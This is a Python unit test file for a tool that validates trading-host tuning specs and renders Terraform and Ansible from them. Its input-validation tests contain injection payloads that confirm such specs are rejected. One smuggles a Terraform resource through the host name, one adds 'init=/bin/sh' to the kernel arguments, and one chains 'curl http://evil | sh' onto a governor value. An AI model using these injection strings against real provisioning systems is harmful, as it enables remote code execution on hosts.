import unittest

from iac_trading_host_manager import (
    DEFAULT_MIN_SOCKET_BUFFER_BYTES,
    IacTradingHostManagerEngine,
    SpecValidationError,
    TradingHostSpec,
    parse_cpu_list,
    validate_spec,
)

try:
    import yaml
except ImportError:  # pragma: no cover - pyyaml is a repo tooling dependency
    yaml = None


def make_spec(**overrides) -> TradingHostSpec:
    """A compliant baseline spec; each test overrides only what it exercises."""
    base = dict(
        host_name="co-ny4-hft-node-01",
        cpu_governor="performance",
        isolated_cpu_cores="2-15",
        disable_cpu_cstates=True,
        net_rmem_max_bytes=134_217_728,
        net_wmem_max_bytes=134_217_728,
        enable_ptp_clock_sync=True,
        hugepages_count=16,
    )
    base.update(overrides)
    return TradingHostSpec(**base)


class TestSpecApproval(unittest.TestCase):

    def setUp(self):
        self.engine = IacTradingHostManagerEngine()

    def test_compliant_spec_is_approved_and_renders_both_artifacts(self):
        report = self.engine.audit_and_generate_iac(make_spec())

        self.assertEqual(report.status, "IAC_SPEC_APPROVED")
        self.assertEqual(report.violations, [])
        self.assertTrue(report.is_approved)
        self.assertTrue(report.is_cpu_governor_valid)
        self.assertTrue(report.is_cpu_isolation_valid)
        self.assertTrue(report.is_cstates_disabled)
        self.assertTrue(report.is_socket_buffer_valid)
        self.assertTrue(report.is_ptp_sync_active)
        self.assertIn('resource "aws_instance"', report.generated_terraform_hcl)
        self.assertIn("cpupower frequency-set -g performance", report.generated_ansible_playbook)

    def test_approval_notes_report_actual_values_not_hardcoded_claims(self):
        report = self.engine.audit_and_generate_iac(make_spec(isolated_cpu_cores="4-11"))
        self.assertIn("isolcpus=4-11", report.audit_notes)
        self.assertIn("ptp4l", report.audit_notes)

    def test_governor_case_is_normalised_before_reaching_cpupower(self):
        # cpupower governor names are lowercase; 'Performance' is accepted as a
        # spec value but must not be emitted verbatim into the shell command.
        report = self.engine.audit_and_generate_iac(make_spec(cpu_governor="Performance"))
        self.assertEqual(report.status, "IAC_SPEC_APPROVED")
        self.assertIn("cpupower frequency-set -g performance", report.generated_ansible_playbook)
        self.assertNotIn("-g Performance", report.generated_ansible_playbook)


class TestPolicyRejections(unittest.TestCase):

    def setUp(self):
        self.engine = IacTradingHostManagerEngine()

    def test_powersave_governor_rejection(self):
        report = self.engine.audit_and_generate_iac(make_spec(cpu_governor="powersave"))
        self.assertEqual(report.status, "REJECTED_POWERSAVE_GOVERNOR")
        self.assertFalse(report.is_cpu_governor_valid)

    def test_cstates_enabled_rejection(self):
        report = self.engine.audit_and_generate_iac(make_spec(disable_cpu_cstates=False))
        self.assertEqual(report.status, "REJECTED_CSTATES_ENABLED")
        self.assertFalse(report.is_cstates_disabled)

    def test_ptp_disabled_is_rejected_not_silently_approved(self):
        # Regression: PTP was audited into a boolean that never gated approval,
        # and the approval note asserted "PTP = True" regardless.
        report = self.engine.audit_and_generate_iac(make_spec(enable_ptp_clock_sync=False))
        self.assertEqual(report.status, "REJECTED_PTP_DISABLED")
        self.assertFalse(report.is_ptp_sync_active)
        self.assertNotIn("PTP = True", report.audit_notes)
        self.assertEqual(report.generated_ansible_playbook, "")

    def test_empty_isolation_is_rejected_not_silently_approved(self):
        # Regression: an empty cpulist previously produced 'isolcpus= nohz_full='
        # on the kernel command line and still returned IAC_SPEC_APPROVED.
        report = self.engine.audit_and_generate_iac(make_spec(isolated_cpu_cores=""))
        self.assertEqual(report.status, "REJECTED_INVALID_SPEC")
        self.assertFalse(report.is_cpu_isolation_valid)
        self.assertEqual(report.generated_terraform_hcl, "")

    def test_isolating_cpu_zero_is_rejected(self):
        report = self.engine.audit_and_generate_iac(make_spec(isolated_cpu_cores="0-15"))
        self.assertEqual(report.status, "REJECTED_NO_CPU_ISOLATION")
        self.assertIn("CPU 0", report.audit_notes)

    def test_isolated_cpu_beyond_host_cpu_count_is_rejected(self):
        report = self.engine.audit_and_generate_iac(
            make_spec(isolated_cpu_cores="2-63", total_cpu_count=16)
        )
        self.assertEqual(report.status, "REJECTED_NO_CPU_ISOLATION")

    def test_send_buffer_below_policy_is_rejected(self):
        # The receive buffer alone previously decided the check message.
        report = self.engine.audit_and_generate_iac(make_spec(net_wmem_max_bytes=1024))
        self.assertEqual(report.status, "REJECTED_SMALL_BUFFERS")
        self.assertIn("wmem_max", report.audit_notes)

    def test_buffer_threshold_is_configurable_policy(self):
        strict = IacTradingHostManagerEngine(min_socket_buffer_bytes=268_435_456)
        report = strict.audit_and_generate_iac(make_spec())
        self.assertEqual(report.status, "REJECTED_SMALL_BUFFERS")
        self.assertEqual(
            IacTradingHostManagerEngine().min_socket_buffer_bytes,
            DEFAULT_MIN_SOCKET_BUFFER_BYTES,
        )

    def test_exact_threshold_is_accepted(self):
        report = self.engine.audit_and_generate_iac(
            make_spec(
                net_rmem_max_bytes=DEFAULT_MIN_SOCKET_BUFFER_BYTES,
                net_wmem_max_bytes=DEFAULT_MIN_SOCKET_BUFFER_BYTES,
            )
        )
        self.assertEqual(report.status, "IAC_SPEC_APPROVED")

    def test_every_violation_is_reported_not_only_the_first(self):
        report = self.engine.audit_and_generate_iac(
            make_spec(
                cpu_governor="powersave",
                disable_cpu_cstates=False,
                enable_ptp_clock_sync=False,
            )
        )
        self.assertEqual(report.status, "REJECTED_POWERSAVE_GOVERNOR")
        self.assertEqual(
            report.violations,
            [
                "REJECTED_POWERSAVE_GOVERNOR",
                "REJECTED_CSTATES_ENABLED",
                "REJECTED_PTP_DISABLED",
            ],
        )

    def test_rejected_spec_never_yields_artifacts(self):
        for spec in (
            make_spec(cpu_governor="schedutil"),
            make_spec(disable_cpu_cstates=False),
            make_spec(enable_ptp_clock_sync=False),
            make_spec(net_rmem_max_bytes=4096),
        ):
            with self.subTest(spec=spec.cpu_governor):
                report = self.engine.audit_and_generate_iac(spec)
                self.assertNotEqual(report.status, "IAC_SPEC_APPROVED")
                self.assertEqual(report.generated_terraform_hcl, "")
                self.assertEqual(report.generated_ansible_playbook, "")


class TestInputValidation(unittest.TestCase):

    def setUp(self):
        self.engine = IacTradingHostManagerEngine()

    def test_hostile_host_name_cannot_reach_generated_code(self):
        spec = make_spec(host_name='node" }\nresource "null_resource" "pwn" {')
        report = self.engine.audit_and_generate_iac(spec)
        self.assertEqual(report.status, "REJECTED_INVALID_SPEC")
        self.assertEqual(report.generated_terraform_hcl, "")
        with self.assertRaises(SpecValidationError):
            self.engine.generate_terraform_hcl(spec)
        with self.assertRaises(SpecValidationError):
            self.engine.generate_ansible_playbook(spec)

    def test_extra_kernel_arguments_cannot_ride_in_on_the_cpu_list(self):
        report = self.engine.audit_and_generate_iac(
            make_spec(isolated_cpu_cores="2-15 init=/bin/sh")
        )
        self.assertEqual(report.status, "REJECTED_INVALID_SPEC")

    def test_shell_metacharacters_cannot_ride_in_on_the_governor(self):
        report = self.engine.audit_and_generate_iac(
            make_spec(cpu_governor="performance; curl http://evil | sh")
        )
        self.assertEqual(report.status, "REJECTED_INVALID_SPEC")

    def test_negative_and_non_integer_sizes_are_rejected(self):
        for override in (
            {"net_rmem_max_bytes": -1},
            {"hugepages_count": -4},
            {"hugepage_size_kb": 0},
            {"total_cpu_count": 0},
        ):
            with self.subTest(**override):
                report = self.engine.audit_and_generate_iac(make_spec(**override))
                self.assertEqual(report.status, "REJECTED_INVALID_SPEC")

    def test_inverted_cpu_range_is_rejected(self):
        self.assertTrue(validate_spec(make_spec(isolated_cpu_cores="15-2")))

    def test_stride_cpu_list_is_rejected_rather_than_mis_parsed(self):
        with self.assertRaises(SpecValidationError):
            parse_cpu_list("0-15:2/4")

    def test_parse_cpu_list_expands_mixed_forms(self):
        self.assertEqual(parse_cpu_list("2-4,9,12-13"), frozenset({2, 3, 4, 9, 12, 13}))


class TestGeneratedArtifacts(unittest.TestCase):

    def setUp(self):
        self.engine = IacTradingHostManagerEngine()

    @unittest.skipIf(yaml is None, "pyyaml not installed")
    def test_generated_playbook_is_valid_yaml_with_expected_tasks(self):
        playbook = self.engine.generate_ansible_playbook(make_spec())
        document = yaml.safe_load(playbook)

        self.assertIsInstance(document, list)
        task_names = [task["name"] for task in document[0]["tasks"]]
        self.assertTrue(any("governor" in name for name in task_names))
        self.assertTrue(any("PTP" in name for name in task_names))

    def test_playbook_regenerates_the_bootloader_and_never_reboots(self):
        # Editing /etc/default/grub without regenerating grub.cfg leaves the
        # tuning staged and inert; rebooting a host that may hold positions is
        # an operator decision, so the playbook asserts instead.
        playbook = self.engine.generate_ansible_playbook(make_spec())
        self.assertIn("update-grub", playbook)
        self.assertIn("grubby --update-kernel=ALL", playbook)
        self.assertIn("/proc/cmdline", playbook)
        self.assertIn("ansible.builtin.assert", playbook)
        self.assertNotIn("ansible.builtin.reboot", playbook)

    def test_playbook_appends_to_grub_cmdline_instead_of_replacing_it(self):
        # Regression: the previous template wrote a fixed
        # GRUB_CMDLINE_LINUX_DEFAULT line, discarding console= and root=.
        playbook = self.engine.generate_ansible_playbook(make_spec())
        self.assertIn("backrefs: true", playbook)
        self.assertIn(r'GRUB_CMDLINE_LINUX_DEFAULT="\1 {{ trading_kernel_args }}"', playbook)

    def test_cstate_arguments_reflect_actual_kernel_behaviour(self):
        # acpi_idle clamps max_cstate=0 to 1, and processor.* is inert while
        # intel_idle is loaded, so both parameters must be emitted.
        args = self.engine.kernel_command_line_args(make_spec())
        self.assertIn("intel_idle.max_cstate=0", args)
        self.assertIn("processor.max_cstate=1", args)
        self.assertNotIn("processor.max_cstate=0", args)

    def test_cstate_arguments_are_omitted_when_not_requested(self):
        args = self.engine.kernel_command_line_args(
            make_spec(disable_cpu_cstates=False)
        )
        self.assertNotIn("max_cstate", args)

    def test_isolation_arguments_include_rcu_offload(self):
        args = self.engine.kernel_command_line_args(make_spec(isolated_cpu_cores="2-7,10"))
        self.assertIn("isolcpus=2-7,10", args)
        self.assertIn("nohz_full=2-7,10", args)
        self.assertIn("rcu_nocbs=2-7,10", args)

    def test_gigantic_pages_are_reserved_on_the_kernel_command_line(self):
        # vm.nr_hugepages only sizes the default (2 MiB on x86_64) pool, so a
        # 1 GiB request must become hugepagesz=/hugepages= boot parameters.
        spec = make_spec(hugepages_count=16, hugepage_size_kb=1048576)
        args = self.engine.kernel_command_line_args(spec)
        self.assertIn("hugepagesz=1G", args)
        self.assertIn("hugepages=16", args)
        self.assertNotIn("vm.nr_hugepages", self.engine.generate_ansible_playbook(spec))

    def test_default_size_pages_use_the_sysctl_pool(self):
        playbook = self.engine.generate_ansible_playbook(make_spec(hugepage_size_kb=2048))
        self.assertIn("vm.nr_hugepages", playbook)
        self.assertNotIn("hugepagesz", playbook)

    def test_sysctl_task_applies_to_the_running_kernel(self):
        # sysctl_set defaults to false, which only writes the file.
        self.assertIn("sysctl_set: true", self.engine.generate_ansible_playbook(make_spec()))

    def test_ptp_playbook_disciplines_clock_realtime_too(self):
        # ptp4l alone leaves CLOCK_REALTIME free-running.
        playbook = self.engine.generate_ansible_playbook(make_spec())
        self.assertIn("ptp4l", playbook)
        self.assertIn("phc2sys", playbook)

    def test_ptp_template_units_are_supported(self):
        playbook = self.engine.generate_ansible_playbook(
            make_spec(ptp_service_units=("ptp4l@ens1f0", "phc2sys@ens1f0"))
        )
        self.assertIn("ptp4l@ens1f0", playbook)

    def test_terraform_identifier_is_valid_when_host_name_starts_with_a_digit(self):
        # Terraform identifiers must not begin with a digit.
        hcl = self.engine.generate_terraform_hcl(make_spec(host_name="01-ny4-node"))
        self.assertIn('resource "aws_instance" "host_01_ny4_node"', hcl)

    def test_terraform_uses_a_variable_rather_than_a_placeholder_ami(self):
        hcl = self.engine.generate_terraform_hcl(make_spec())
        self.assertIn("var.trading_host_ami", hcl)
        self.assertNotIn("ami-0123456789abcdef0", hcl)
        self.assertIn("prevent_destroy = true", hcl)

    def test_instance_type_comes_from_the_spec(self):
        hcl = self.engine.generate_terraform_hcl(make_spec(instance_type="m6i.metal"))
        self.assertIn('instance_type = "m6i.metal"', hcl)


class TestPlatformWarnings(unittest.TestCase):

    def setUp(self):
        self.engine = IacTradingHostManagerEngine()

    def test_non_metal_instance_type_warns_but_does_not_reject(self):
        # AWS documents OS C-state/P-state control for bare metal instances and
        # an enumerated list of others; Graviton exposes none.
        report = self.engine.audit_and_generate_iac(make_spec(instance_type="c6g.16xlarge"))
        self.assertEqual(report.status, "IAC_SPEC_APPROVED")
        self.assertTrue(any("bare-metal" in w for w in report.warnings))

    def test_metal_instance_type_raises_no_platform_warning(self):
        report = self.engine.audit_and_generate_iac(make_spec(instance_type="c6i.metal"))
        self.assertFalse(any("bare-metal" in w for w in report.warnings))

    def test_default_hugepage_size_warns_about_actual_reserved_memory(self):
        report = self.engine.audit_and_generate_iac(make_spec(hugepages_count=16))
        self.assertTrue(any("32 MiB" in w for w in report.warnings))


if __name__ == '__main__':
    unittest.main()
